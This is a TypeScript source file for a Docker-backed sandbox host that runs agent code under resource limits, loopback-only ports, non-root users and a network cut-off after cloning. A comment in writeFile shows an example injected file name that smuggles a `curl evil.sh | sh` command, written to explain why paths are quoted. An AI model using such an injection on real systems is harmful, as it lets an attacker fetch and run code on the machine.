import { FactoryError } from '@factory/shared';
import { TIMEOUT_EXIT_CODE } from '../engines/limits';
import { quoteOne } from './shell';
import { resolveShell } from './shell-path';
import { annotateUnreachable } from './unreachable';

/**
 * The container host, behind one interface. The Runner is the only component
 * with rights here (research.md D5), and putting the boundary in an interface
 * means the lifecycle logic is testable without a daemon.
 */

export interface ContainerSpec {
  image: string;
  /**
   * Ceilings from the workspace settings (FR-085). Upper bounds on what a run
   * may consume, never minimums: an execution host that offers fixed
   * allocations gives the largest that fits WITHIN these, and refuses to
   * create a sandbox at all when none does (002 FR-005, FR-009).
   */
  cpu: number;
  memoryMb: number;
  /** Not quantised: enforced exactly, by the host itself (002 FR-009a, FR-010). */
  wallClockMinutes: number;
  /**
   * Whether the sandbox keeps its network once it has been prepared (FR-085).
   *
   * Recorded on the spec, but NOT applied at creation: the repository is
   * cloned from inside the container, so a container created with no network
   * cannot be prepared at all. `startRunWorkspace` clones first and then calls
   * `disconnectNetwork` when this is `false`, which is the point at which a
   * sandbox stops being able to send anything out — before any step runs.
   */
  network: boolean;
  /** Credentials arrive as environment, never as files (FR-083). */
  env: Record<string, string>;
  workdir: string;
  /**
   * Container ports to publish on the host's loopback interface (003 FR-006).
   *
   * Loopback only, never every interface: a launched project is arbitrary
   * code from a branch, reachable by whoever can reach the machine, and that
   * should be the person who pressed the button. The host port is chosen by
   * Docker and read back with `address`, so two launches cannot collide.
   */
  publish?: number[];
}

export interface ExecResult {
  exitCode: number;
  stdout: string;
  stderr: string;
}

export interface ExecOptions {
  cwd?: string;
  env?: Record<string, string>;
  timeoutMs?: number;
  /** Called as output arrives, so the live log is live (FR-076). */
  onOutput?: (stream: 'stdout' | 'stderr', text: string) => void;
}

export interface ContainerHost {
  /**
   * Whether this host can take a sandbox off the network at all.
   *
   * A container can be disconnected; a process on the machine it runs on
   * cannot. Where it cannot, the workspace's "no network while code is
   * written" setting is not applied and the run says so, rather than being
   * refused for asking something no run here could ever be granted.
   * Absent means yes, which is what every host but the process host is.
   */
  readonly isolates?: boolean;
  create(spec: ContainerSpec): Promise<string>;
  exec(containerId: string, argv: string[], options?: ExecOptions): Promise<ExecResult>;
  writeFile(containerId: string, path: string, content: string): Promise<void>;
  readFile(containerId: string, path: string): Promise<string | null>;
  /** Null when the path does not exist. Size distinguishes empty from absent. */
  stat(containerId: string, path: string): Promise<{ size: number } | null>;
  /**
   * Where a published container port can be reached from the host, as
   * `host:port`, or null when the port was not published (003 FR-006).
   */
  address(containerId: string, port: number): Promise<string | null>;
  /**
   * Cuts the container off from every network it is attached to.
   *
   * A sandbox has to reach the internet exactly once — to clone the
   * repository — and the workspace's setting is about what happens AFTER
   * that, while an agent is writing code. `--network none` at creation
   * expressed the second and prevented the first: the container came up with
   * no network and the clone inside it could not resolve a hostname, so with
   * the default setting no run could start at all.
   *
   * So the network is given, used, and then taken away. It must actually be
   * taken away: the caller treats a failure here as a failed start rather
   * than carrying on with a connected sandbox the workspace asked to isolate.
   */
  disconnectNetwork(containerId: string): Promise<void>;
  destroy(containerId: string): Promise<void>;
}

/** Shells out to the Docker CLI. One fresh container per run, never reused. */
export const dockerHost: ContainerHost = {
  async create(spec) {
    const argv = [
      'run',
      '--detach',
      '--user',
      // Non-root: an agent runs arbitrary code against a customer repository.
      '1000:1000',
      '--cpus',
      String(spec.cpu),
      '--memory',
      `${spec.memoryMb}m`,
      '--workdir',
      spec.workdir,
      // Deliberately NOT `--network none` when the workspace wants isolation:
      // the repository is cloned from inside this container, which needs a
      // network to do it. `disconnectNetwork` takes it away once the clone is
      // done — see the note on that method.
      // `127.0.0.1::<port>` — loopback, and a host port Docker picks.
      ...(spec.publish ?? []).flatMap((port) => ['--publish', `127.0.0.1::${port}`]),
      ...Object.keys(spec.env).flatMap((key) => ['--env', key]),
      spec.image,
      'sleep',
      String(spec.wallClockMinutes * 60),
    ];
    const result = await run('docker', argv, { env: spec.env });
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', 'could not create the sandbox', {
        detail: result.stderr.trim(),
      });
    }
    return result.stdout.trim();
  },

  async disconnectNetwork(containerId) {
    // Every network it is on, not just the default one: a machine whose Docker
    // is configured with another default would otherwise keep its connection.
    const attached = await run('docker', [
      'inspect',
      '--format',
      '{{range $name, $_ := .NetworkSettings.Networks}}{{$name}} {{end}}',
      containerId,
    ]);
    if (attached.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', 'could not read the sandbox’s networks', {
        detail: attached.stderr.trim(),
      });
    }
    for (const network of attached.stdout.trim().split(/\s+/).filter(Boolean)) {
      const result = await run('docker', ['network', 'disconnect', network, containerId]);
      if (result.exitCode !== 0) {
        throw new FactoryError('sandbox_lost', `could not disconnect the sandbox from ${network}`, {
          detail: result.stderr.trim(),
        });
      }
    }
  },

  async exec(containerId, argv, options) {
    const env = options?.env ?? {};
    const docker = [
      'exec',
      ...(options?.cwd ? ['--workdir', options.cwd] : []),
      ...Object.keys(env).flatMap((key) => ['--env', key]),
      containerId,
      ...argv,
    ];
    const result = await run('docker', docker, { env, ...options });
    // A failed command that could not reach something says so in its own
    // output, as one line a person can act on (FR-013). It adds a sentence and
    // never changes an outcome — see `unreachable.ts`.
    return result.exitCode === 0
      ? result
      : { ...result, stderr: annotateUnreachable(result.stderr, result.stdout) };
  },

  async writeFile(containerId, path, content) {
    // `path` is data — a step's required documents are typed into the pipeline
    // builder, so an unquoted interpolation here would let a document named
    // `a'; curl evil.sh | sh; '.md` run whatever it liked (FR-015).
    //
    // The parent directory is made first, as the process host makes it: a
    // document named `docs/spec.md` in a repository that has no `docs` yet is
    // an ordinary thing to ask for, and `cat` alone answered it with
    // "Directory nonexistent".
    const parent = path.slice(0, path.lastIndexOf('/')) || '/';
    const result = await run(
      'docker',
      [
        'exec',
        '-i',
        containerId,
        'sh',
        '-c',
        `mkdir -p ${quoteOne(parent)} && cat > ${quoteOne(path)}`,
      ],
      { stdin: content },
    );
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', `could not write ${path}`, {
        detail: result.stderr.trim(),
      });
    }
  },

  async readFile(containerId, path) {
    const result = await run('docker', ['exec', containerId, 'cat', path]);
    if (result.exitCode === 0) return result.stdout;
    // A missing document and a lost sandbox are different answers, and this
    // used to give the same one for both (F2). The consequence was specific:
    // a step whose sandbox died mid-run reported its required document as not
    // produced, so the run failed for the wrong reason and a retry looked
    // pointless. `docker exec` fails for either cause, so the container has to
    // be asked which it was.
    await assertContainerAlive(containerId, path);
    return null;
  },

  async stat(containerId, path) {
    const result = await run('docker', [
      'exec',
      containerId,
      'sh',
      '-c',
      // Same reason as writeFile: this path came from a person (FR-015).
      `test -f ${quoteOne(path)} && wc -c < ${quoteOne(path)}`,
    ]);
    if (result.exitCode === 0) {
      const size = Number(result.stdout.trim());
      return Number.isFinite(size) ? { size } : null;
    }
    // `test -f` exits 1 for a missing path, which is indistinguishable from
    // `docker exec` failing because there is no container. Same question,
    // same answer as readFile (F3).
    await assertContainerAlive(containerId, path);
    return null;
  },

  async address(containerId, port) {
    const result = await run('docker', ['port', containerId, `${port}/tcp`]);
    if (result.exitCode !== 0) return null;
    // Docker prints one line per bound address, e.g. `127.0.0.1:49153`, and
    // on some hosts a second for `[::1]`. The loopback IPv4 one is the one a
    // browser on this machine reaches.
    const line = result.stdout
      .split('\n')
      .map((entry) => entry.trim())
      .find((entry) => entry.startsWith('127.0.0.1:'));
    return line ?? null;
  },

  async destroy(containerId) {
    await run('docker', ['rm', '--force', containerId]);
  },
};

/**
 * Throws `sandbox_lost` if the container is not running, and returns quietly if
 * it is (F2, F3).
 *
 * Called only on the failure path of a read. That path is not rare — asking
 * whether a step produced its required document is an ordinary absent read — so
 * this costs one extra `docker inspect` per missing file, which is a cheap
 * price for the distinction it buys: `null` means "that file is not there" and
 * never "there is nowhere to look". Which is the difference between a step that
 * failed to produce its document and a run that should be rebuilt from its last
 * commit by `withSandboxRecovery`.
 *
 * A container that has stopped for any reason counts as lost, including one
 * that exited on its own wall-clock `sleep`: from a caller's point of view
 * there is no sandbox either way.
 */
async function assertContainerAlive(containerId: string, path: string): Promise<void> {
  // Anything that stops us CONFIRMING the container is up counts as lost,
  // including the daemon itself being unreachable — `Bun.spawn` throws outright
  // when there is no `docker` to run at all. The conservative answer is the
  // right one here: recovery rebuilds the sandbox once and resumes from the
  // branch, which is correct if it really is gone and harmless if the read was
  // simply of a file that was never written.
  const state = await run('docker', ['inspect', '--format', '{{.State.Running}}', containerId])
    .then((probe) => (probe.exitCode === 0 ? probe.stdout.trim() : probe.stderr.trim()))
    .catch((error) => (error instanceof Error ? error.message : String(error)));
  if (state !== 'true') {
    throw new FactoryError('sandbox_lost', `the sandbox is gone, so ${path} could not be read`, {
      detail: state,
    });
  }
}

/**
 * Exported so the deadline can be proven against a real process. An agent's
 * time limit is only a limit if something enforces it (FR-080), and that
 * something is here.
 */
export async function run(
  command: string,
  argv: string[],
  options: { env?: Record<string, string>; stdin?: string } & ExecOptions = {},
): Promise<ExecResult> {
  // `sh` is not on the PATH on Windows, and the `bash` that is belongs to
  // WSL; the shell that comes with Git is the one every script here is for.
  const executable = command === 'sh' && process.platform === 'win32' ? resolveShell() : command;
  const proc = Bun.spawn([executable, ...argv], {
    env: { ...process.env, ...options.env },
    stdin: options.stdin ? new TextEncoder().encode(options.stdin) : 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
  });

  // An agent's time limit is only a limit if something enforces it (FR-080).
  // The deadline kills the process and reports the same code `timeout(1)`
  // uses, so the caller can tell a deadline from an ordinary failure.
  let killedAtDeadline = false;
  const deadline = options.timeoutMs
    ? setTimeout(() => {
        killedAtDeadline = true;
        proc.kill('SIGKILL');
      }, options.timeoutMs)
    : null;

  try {
    const [stdout, stderr] = await Promise.all([
      drain(proc.stdout, (text) => options.onOutput?.('stdout', text)),
      drain(proc.stderr, (text) => options.onOutput?.('stderr', text)),
    ]);
    const exitCode = await proc.exited;
    return killedAtDeadline
      ? {
          exitCode: TIMEOUT_EXIT_CODE,
          stdout,
          stderr: `${stderr}\nstopped after ${options.timeoutMs}ms`.trim(),
        }
      : { exitCode, stdout, stderr };
  } finally {
    if (deadline) clearTimeout(deadline);
  }
}

export async function drain(
  stream: ReadableStream<Uint8Array>,
  onChunk?: (text: string) => void,
): Promise<string> {
  const decoder = new TextDecoder();
  let all = '';
  for await (const chunk of stream) {
    const text = decoder.decode(chunk, { stream: true });
    all += text;
    onChunk?.(text);
  }
  return all;
}
